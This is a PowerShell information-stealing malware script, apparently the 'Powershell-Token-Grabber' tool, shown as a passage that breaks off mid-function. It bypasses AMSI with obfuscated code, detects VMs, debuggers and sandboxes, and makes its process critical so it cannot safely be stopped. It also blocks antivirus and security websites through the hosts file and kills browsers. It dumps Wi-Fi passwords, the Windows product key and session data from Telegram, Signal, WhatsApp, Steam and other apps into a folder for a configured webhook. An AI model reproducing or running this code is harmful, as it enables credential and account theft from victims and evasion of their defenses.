$debug = $false

if ($debug) {
    $ProgressPreference = 'Continue'
}
else {
    $ErrorActionPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
}


function KDMUTEX {
    $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if ( -not $CreatedNew ) {
        throw "An instance of this script is already running."
    }
    else {
        if ($debug) {
            Invoke-TASKS
        }
        else {
            VMBYPASSER
        }
    }
}

Add-Type -AssemblyName PresentationCore, PresentationFramework

$webhook = "YOUR_WEBHOOK_HERE"
$avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"


#THIS CODE WAS MADE BY EvilByteCode
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class ProcessUtility
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

    public static void MakeProcessCritical()
    {
        Process.EnterDebugMode();
        RtlSetProcessIsCritical(1, 0, 0);
    }

    public static void MakeProcessKillable()
    {
        RtlSetProcessIsCritical(0, 0, 0);
    }
}
"@
#END OF CODE MADE BY EvilByteCode

# Request admin with AMSI bypass
function INVOKE-AC {
    ${kDOt} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtkb3QuU2V0VmFsdWUoJG51bGwsJHRydWUp")) | &([regex]::Unescape("\u0069\u0065\u0078"))
    $kdotcheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $kdotcheck
}

function Hide-Console {
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
            [DllImport("Kernel32.dll")]
            public static extern IntPtr GetConsoleWindow();
            [DllImport("user32.dll")]
            public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
            '
    }
    $consolePtr = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consolePtr, 0)
}

function make_error_page {
    param(
        [Parameter(Mandatory = $true)]
        [string]$error_message
    )
    $null = [System.Windows.MessageBox]::Show("$error_message", "ERROR", 0, 16)
}

function Search-Mac ($mac_addresses) {
    $pc_mac = Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -ExpandProperty macaddress -join ","
    return $mac_addresses -contains $pc_mac
}

function Search-IP ($ip_addresses) {
    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $pc_ip = $pc_ip.Content
    return $ip_addresses -contains $pc_ip
}

function Search-HWID ($hwids) {
    $pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    return $hwids -contains $pc_hwid
}

function Search-Username ($usernames) {
    $pc_username = $env:USERNAME
    return $usernames -contains $pc_username
}

function ram_check {
    $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
    if ($ram -lt 4) {
        make_error_page "RAM CHECK FAILED"
        Start-Sleep -Seconds 3
        exit
    }
}

function VMBYPASSER {
    ram_check
    $processnames = @(
        "autoruns",
        "die",
        "dumpcap",
        "dumpcap",
        "fakenet",
        "fiddler",
        "filemon",
        "hookexplorer",
        "httpdebugger",
        "immunitydebugger",
        "importrec",
        "joeboxcontrol",
        "joeboxserver",
        "lordpe",
        "ollydbg",
        "petools",
        "proc_analyzer",
        "processhacker",
        "procexp",
        "procmon",
        "qemu-ga",
        "qga",
        "resourcehacker",
        "sandman",
        "scylla_x64",
        "sysanalyzer",
        "sysinspector",
        "sysmon",
        "tcpview",
        "tcpview64",
        "tcpdump",
        "vboxservice",
        "vboxtray",
        "vboxcontrol",
        "vmacthlp",
        "vmwareuser",
        "windbg",
        "wireshark",
        "x32dbg",
        "x64dbg",
        "xenservice"
    )
    $detectedProcesses = Get-Process -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name

    if ($detectedProcesses) { 
        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
        Exit 1
    }
    else { 
        Invoke-ANTITOTAL
    }
}

function Invoke-ANTITOTAL {
    $urls = @(
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
    )
    $functions = @(
        "Search-Mac",
        "Search-IP",
        "Search-HWID",
        "Search-Username"
    )
    
    for ($i = 0; $i -lt $urls.Count; $i++) {
        $url = $urls[$i]
        $functionName = $functions[$i]
        
        $result = Invoke-WebRequest -Uri $url -UseBasicParsing
        if ($result.StatusCode -eq 200) {
            $content = $result.Content
            $function = Get-Command -Name $functionName
            $output = & $function.Name $content
            
            if ($output -eq $true) {
                make_error_page "Detected VM"
                Start-Sleep -s 3
                exit
            }
        }
    }

    [ProcessUtility]::MakeProcessCritical()	
    Invoke-TASKS
}

function HOSTS-BLOCKER {
    $KDOT = Select-String -Path "$env:windir\System32\Drivers\etc\hosts" -Pattern "GODFATHER"
    if ($KDOT -ne $null) {}else {
        Add-Content c:\Windows\System32\Drivers\etc\hosts "`n#GODFATHER `n0.0.0.0 www.malwarebytes.com`n0.0.0.0 malwarebytes.com`n0.0.0.0 143.204.176.32`n0.0.0.0 www.antivirussoftwareguide.com`n0.0.0.0 antivirussoftwareguide.com`n0.0.0.0 68.183.21.156`n0.0.0.0 www.norton.com`n0.0.0.0 norton.com`n0.0.0.0 23.99.92.83`n0.0.0.0 www.avg.com`n0.0.0.0 avg.com`n0.0.0.0 69.94.64.29`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.avast.com`n0.0.0.0 avast.com`n0.0.0.0 2.22.100.83`n0.0.0.0 www.uk.pcmag.com`n0.0.0.0 uk.pcmag.com`n0.0.0.0 104.17.101.99`n0.0.0.0 www.bitdefender.co.uk`n0.0.0.0 bitdefender.co.uk`n0.0.0.0 172.64.144.176`n0.0.0.0 www.webroot.com`n0.0.0.0 webroot.com`n0.0.0.0 66.35.53.194`n0.0.0.0 www.mcafee.com`n0.0.0.0 mcafee.com`n0.0.0.0 161.69.29.243`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.go.crowdstrike.com`n0.0.0.0 go.crowdstrike.com`n0.0.0.0 104.18.64.82`n0.0.0.0 www.sophos.com`n0.0.0.0 sophos.com`n0.0.0.0 23.198.89.209`n0.0.0.0 www.f-secure.com`n0.0.0.0 f-secure.com`n0.0.0.0 23.198.76.113`n0.0.0.0 www.gdatasoftware.com`n0.0.0.0 gdatasoftware.com`n0.0.0.0 212.23.151.164`n0.0.0.0 www.trendmicro.com`n0.0.0.0 trendmicro.com`n0.0.0.0 216.104.20.24`n0.0.0.0 www.virustotal.com`n0.0.0.0 virustotal.com`n0.0.0.0 216.239.32.21`n0.0.0.0 www.acronis.com`n0.0.0.0 acronis.com`n0.0.0.0 34.120.97.237`n0.0.0.0 www.adaware.com`n0.0.0.0 adaware.com`n0.0.0.0 104.16.236.79`n0.0.0.0 www.ahnlab.com`n0.0.0.0 ahnlab.com`n0.0.0.0 211.233.80.53`n0.0.0.0 www.antiy.net`n0.0.0.0 antiy.net`n0.0.0.0 47.91.137.195`n0.0.0.0 www.symantec.com`n0.0.0.0 symantec.com`n0.0.0.0 50.112.202.115`n0.0.0.0 www.broadcom.com`n0.0.0.0 broadcom.com`n0.0.0.0 50.112.202.115`n0.0.0.0 www.superantispyware.com`n0.0.0.0 superantispyware.com`n0.0.0.0 44.231.57.118`n0.0.0.0 www.sophos.com`n0.0.0.0 sophos.com`n0.0.0.0 23.198.89.209`n0.0.0.0 www.sangfor.com`n0.0.0.0 sangfor.com`n0.0.0.0 151.101.2.133`n0.0.0.0 www.rising-global.com`n0.0.0.0 rising-global.com`n0.0.0.0 219.238.233.230`n0.0.0.0 www.webroot.com`n0.0.0.0 webroot.com`n0.0.0.0 66.35.53.194`n0.0.0.0 www.wearethinc.com`n0.0.0.0 wearethinc.com`n0.0.0.0 217.199.161.10`n0.0.0.0 www.cybernews.com`n0.0.0.0 cybernews.com`n0.0.0.0 172.66.43.197`n0.0.0.0 www.quickheal.com`n0.0.0.0 quickheal.com`n0.0.0.0 103.228.50.23`n0.0.0.0 www.pandasecurity.com`n0.0.0.0 pandasecurity.com`n0.0.0.0 91.216.218.44`n0.0.0.0 www.trendmicro.com`n0.0.0.0 trendmicro.com`n0.0.0.0 216.104.20.24`n0.0.0.0 www.guard.io`n0.0.0.0 guard.io`n0.0.0.0 34.102.139.130`n0.0.0.0 www.maxpcsecure.com`n0.0.0.0 maxpcsecure.com`n0.0.0.0 70.35.199.101`n0.0.0.0 www.maxsecureantivirus.com`n0.0.0.0 maxsecureantivirus.com`n0.0.0.0 70.35.199.101`n0.0.0.0 www.akamai.com`n0.0.0.0 akamai.com`n0.0.0.0 104.82.181.162`n0.0.0.0 www.lionic.com`n0.0.0.0 lionic.com`n0.0.0.0 220.130.53.233`n0.0.0.0 www.ccm.net`n0.0.0.0 ccm.net`n0.0.0.0 23.55.12.105`n0.0.0.0 www.kaspersky.co.uk`n0.0.0.0 kaspersky.co.uk`n0.0.0.0 185.85.15.26`n0.0.0.0 www.crowdstrike.com`n0.0.0.0 crowdstrike.com`n0.0.0.0 104.18.64.82`n0.0.0.0 www.k7computing.com`n0.0.0.0 k7computing.com`n0.0.0.0 52.172.54.225`n0.0.0.0 www.softonic.com`n0.0.0.0 softonic.com`n0.0.0.0 35.227.233.104`n0.0.0.0 www.ikarussecurity.com`n0.0.0.0 ikarussecurity.com`n0.0.0.0 91.212.136.200`n0.0.0.0 www.gridinsoft.com`n0.0.0.0 gridinsoft.com`n0.0.0.0 104.26.9.187`n0.0.0.0 www.simspace.com`n0.0.0.0 simspace.com`n0.0.0.0 104.21.82.22`n0.0.0.0 www.osirium.com`n0.0.0.0 osirium.com`n0.0.0.0 35.197.237.129`n0.0.0.0 www.gdatasoftware.co.uk`n0.0.0.0 gdatasoftware.co.uk`n0.0.0.0 212.23.151.164`n0.0.0.0 www.gdatasoftware.com`n0.0.0.0 gdatasoftware.com`n0.0.0.0 212.23.151.164`n0.0.0.0 www.basicsprotection.com`n0.0.0.0 basicsprotection.com`n0.0.0.0 3.111.153.145`n0.0.0.0 www.fortinet.com`n0.0.0.0 fortinet.com`n0.0.0.0 3.1.92.70`n0.0.0.0 www.f-secure.com`n0.0.0.0 f-secure.com`n0.0.0.0 23.198.76.113`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.escanav.com`n0.0.0.0 escanav.com`n0.0.0.0 67.222.129.224`n0.0.0.0 www.emsisoft.com`n0.0.0.0 emsisoft.com`n0.0.0.0 104.20.206.62`n0.0.0.0 www.drweb.com`n0.0.0.0 drweb.com`n0.0.0.0 178.248.233.94`n0.0.0.0 www.cyren.com`n0.0.0.0 cyren.com`n0.0.0.0 216.163.188.84`n0.0.0.0 www.cynet.com`n0.0.0.0 cynet.com`n0.0.0.0 172.67.38.94`n0.0.0.0 www.comodosslstore.com`n0.0.0.0 comodosslstore.com`n0.0.0.0 172.67.28.161`n0.0.0.0 www.clamav.net`n0.0.0.0 clamav.net`n0.0.0.0 198.148.79.54`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.totalav.com`n0.0.0.0 totalav.com`n0.0.0.0 34.117.198.220`n0.0.0.0 www.bitdefender.co.uk`n0.0.0.0 bitdefender.co.uk`n0.0.0.0 172.64.144.176`n0.0.0.0 www.baidu.com`n0.0.0.0 baidu.com`n0.0.0.0 39.156.66.10`n0.0.0.0 www.avira.com`n0.0.0.0 avira.com`n0.0.0.0 52.58.28.12`n0.0.0.0 www.avast.com`n0.0.0.0 avast.com`n0.0.0.0 2.22.100.83`n0.0.0.0 www.arcabit.pl`n0.0.0.0 arcabit.pl`n0.0.0.0 188.166.107.22`n0.0.0.0 www.surfshark.com`n0.0.0.0 surfshark.com`n0.0.0.0 104.18.120.34`n0.0.0.0 www.nordvpn.com`n0.0.0.0 nordvpn.com`n0.0.0.0 104.17.49.74`n0.0.0.0 support.microsoft.com`n0.0.0.0 www.support.microsoft.com`n"
    }
    $Browsers = @("chrome", "firefox", "iexplore", "opera", "brave", "msedge")
    $terminatedProcesses = @()
    foreach ($browser in $Browsers) {
        $process = Get-Process -Name $browser -ErrorAction 'SilentlyContinue'
        if ($process -ne $null) {
            Stop-Process -Name $browser -ErrorAction 'SilentlyContinue' -Force
            $terminatedProcesses += $browser
        }
    }
}



function Request-Admin {
    while (-not (INVOKE-AC)) {
        try {
            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        catch {}
    }
}

function Backup-Data {

    $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
    $timezone = Get-TimeZone
    $offsetHours = $timezone.BaseUtcOffset.Hours
    $timezoneString = "UTC$offsetHours"
    $filedate = Get-Date -Format "yyyy-MM-dd"
    $countryCode = (Invoke-WebRequest -Uri "https://ipapi.co/$ip/country_code" -UseBasicParsing).Content
    $folderformat = "$env:APPDATA\KDOT\$countryCode-($uuid)-($filedate)-($timezoneString)"

    $folder_general = $folderformat
    $folder_messaging = "$folderformat\Messaging Sessions"
    $folder_gaming = "$folderformat\Gaming Sessions"
    $folder_crypto = "$folderformat\Crypto Wallets"
    $folder_vpn = "$folderformat\VPN Clients"
    $folder_email = "$folderformat\Email Clients"
    $important_files = "$folderformat\Important Files"
    $browser_data = "$folderformat\Browser Data"

    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data)
    $folders | ForEach-Object {
        New-Item -ItemType Directory -Path $_ -Force
    }

    #bulk data (added build ID with banner)
    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org")
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = Get-Date -Format "r"
    $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
    $osbuild = (Get-ItemProperty -Path "C:\Windows\System32\hal.dll").VersionInfo.FileVersion
    $displayversion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
    $mfg = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
    $model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
    $CPU = (Get-CimInstance -ClassName Win32_Processor).Name
    $corecount = (Get-CimInstance -ClassName Win32_Processor).NumberOfCores
    $GPU = (Get-CimInstance -ClassName Win32_VideoController).Name
    $total = (Get-CimInstance -ClassName Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
    $raminfo = "{0:N2} GB" -f $total
    $mac = (Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MACAddress -join ","
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
	
    # A cool banner 
    $guid = [Guid]::NewGuid()
    $guidString = $guid.ToString()
    $suffix = $guidString.Substring(0, 8)  
    $prefixedGuid = "powershell-token-grabber-" + $suffix
    $ptgbanner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZEgICAgICAgICAgICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICDilojilojilojilojilojilojilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4pWXICAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgICDilojilojilZTilZDilZDilojilojilZcgICDilZrilZDilZDilojilojilZTilZDilZDilZ0gICDilojilojilZTilZDilZDilZDilZDilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgICAgIOKWiOKWiOKVkSAgICAgIOKWiOKWiOKVkSAg4paI4paI4paI4pWXICAgICAgICAgICAgICAg4pWRIA0K4pWRICAgICAgICAgICAgICAgICDilojilojilZTilZDilZDilZDilZ0gICAgICAg4paI4paI4pWRICAgICAg4paI4paI4pWRICAg4paI4paI4pWRICAgICAgICAgICAgICAg4pWRIA0K4pWRICAgICAgICAgICAgICAgICDilojilojilZEgICAgIOKWiOKWiOKVlyAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVl+KVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgICDilZrilZDilZ0gICAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgIGh0dHBzOi8vZ2l0aHViLmNvbS9DaGlsZHJlbk9mWWFod2VoL1Bvd2Vyc2hlbGwtVG9rZW4tR3JhYmJlciAg4pWRDQrilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0NCg==")
    $ptgstrings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ptgbanner))
    $ptginfo = "$ptgstrings`nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
	
    function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime

    function Get-InstalledAV {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery
        $AntivirusProduct.displayName
    }
    $avlist = Get-InstalledAV | Format-Table | Out-String
	
    $width = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[0] }
    $height = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[2] }
    $screen = "$width x $height"

    $software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Format-Table -Wrap -AutoSize |
    Out-String

    $network = Get-NetAdapter |
    Select-Object Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium |
    Out-String

    $startupapps = Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User |
    Format-List |
    Out-String

    $runningapps = Get-WmiObject Win32_Process |
    Select-Object Name, Description, ProcessId, ThreadCount, Handles |
    Format-Table -Wrap -AutoSize |
    Out-String

    $services = Get-WmiObject Win32_Service |
    Where-Object State -eq "Running" |
    Select-Object Name, DisplayName |
    Sort-Object Name |
    Format-Table -Wrap -AutoSize |
    Out-String
	
    function diskdata {
        $disks = Get-WmiObject -Class "Win32_LogicalDisk" -Namespace "root\CIMV2" | Where-Object { $_.Size -gt 0 }
        $results = foreach ($disk in $disks) {
            $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
            $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
            $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
            $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
            $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
            [PSCustomObject]@{
                Drive             = $disk.Name
                Name              = $disk.VolumeName
                "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
            }
        }
        $results 
    }
    $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
    $info = "$ptginfo`n`n`nIP: $ip `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `n`n[Disk Info] $alldiskinfo `n[Hardware] `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
    $info | Out-File -FilePath "$folder_general\System.txt" -Encoding UTF8

    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object {
        $name = $_.Matches.Groups[1].Value.Trim()
        (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
            [PSCustomObject]@{
                PROFILE_NAME = $name
                PASSWORD     = $_.Matches.Groups[1].Value.Trim()
            }
        }
    }
    $wifi = $wifipasslist | Format-Table -AutoSize | Out-String
    $wifi | Out-File -FilePath "$folder_general\WIFIPasswords.txt" -Encoding UTF8

    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        }
        catch {
            return "No product key found"
        }
    }
    Get-ProductKey > $folder_general\productkey.txt
	
    # All Messaging Sessions
    function telegramstealer {
        $processname = "telegram"
        $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        if (!(Test-Path $pathtele)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $destination = "$folder_messaging\Telegram.zip"
        $exclude = @("_*.config", "temp", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview")
        $files = Get-ChildItem -Path $pathtele -Exclude $exclude
        Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
    }


    # Element Session Stealer
    function elementstealer {
        $processname = "element"
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        if (!(Test-Path $elementfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $element_session = "$folder_messaging\Element"
        New-Item -ItemType Directory -Force -Path $element_session
        Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force 
    }


    # ICQ Session Stealer
    function icqstealer {
        $processname = "icq"
        $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
        if (!(Test-Path $icqfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $icq_session = "$folder_messaging\ICQ"
        New-Item -ItemType Directory -Force -Path $icq_session 
        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
    }


    # Signal Session Stealer
    function signalstealer {
        $processname = "signal"
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        if (!(Test-Path $signalfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $signal_session = "$folder_messaging\Signal"
        New-Item -ItemType Directory -Force -Path $signal_session
        Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
    }


    # Viber Session Stealer
    function viberstealer {
        $processname = "viber"
        $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
        if (!(Test-Path $viberfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $viber_session = "$folder_messaging\Viber"
        New-Item -ItemType Directory -Force -Path $viber_session
        $configfiles = @("config$1")
        foreach ($file in $configfiles) {
            Get-ChildItem -path $viberfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $viber_session }
        }
        $pattern = "^([\+|0-9 ][ 0-9.]{1,12})$"
        $directories = Get-ChildItem -Path $viberFolder -Directory | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Force
        }
        $files = Get-ChildItem -Path $viberFolder -File -Recurse -Include "*.db", "*.db-shm", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
        foreach ($file in $files) {
            $parentFolder = Split-Path -Path $file.FullName -Parent
            $phoneNumberFolder = Get-ChildItem -Path $parentFolder -Directory | Where-Object { $_.Name -match $pattern }
            if (-not $phoneNumberFolder) {
                Copy-Item -Path $file.FullName -Destination $destinationPath
            }
        }
    }


    # Whatsapp Session Stealer
    function whatsappstealer {
        $processname = "whatsapp"
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $whatsapp_session = "$folder_messaging\Whatsapp"
        New-Item -ItemType Directory -Force -Path $whatsapp_session
        $regexPattern = "WhatsAppDesktop"
        $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
        if ($parentFolder) {
            $localStateFolder = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
            if ($localStateFolder) {
                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                Copy-Item -Path $localStateFolder.FullName -Destination $destinationPath -Recurse
            }
        }
    }
	
    function skype_stealer {
        $processname = "skype"
        $skypefolder = "$env:appdata\microsoft\skype for desktop"
        if (!(Test-Path $skypefolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $skype_session = "$folder_messaging\Skype"
        New-Item -ItemType Directory -Force -Path $skype_session
        Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
    }

    # All Gaming Sessions
    # Steam Session Stealer
    function steamstealer {
        $processname = "steam"
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        if (!(Test-Path $steamfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $steam_session = "$folder_gaming\Steam"
        New-Item -ItemType Directory -Force -Path $steam_session
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach ($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
    }


    # Minecraft Session Stealer
    function minecraftstealer {
        $minecraft_session = "$folder_gaming\Minecraft"
        if (!(Test-Path $minecraft_session)) { return }
        New-Item -ItemType Directory -Force -Path $minecraft_session
        $minecraftfolder1 = $env:appdata + "\.minecraft"
        $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
        Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
        Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
    }

    # Epicgames Session Stealer
    function epicgames_stealer {
        $processname = "epicgameslauncher"
        $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
        if (!(Test-Path $epicgamesfolder)) { return }
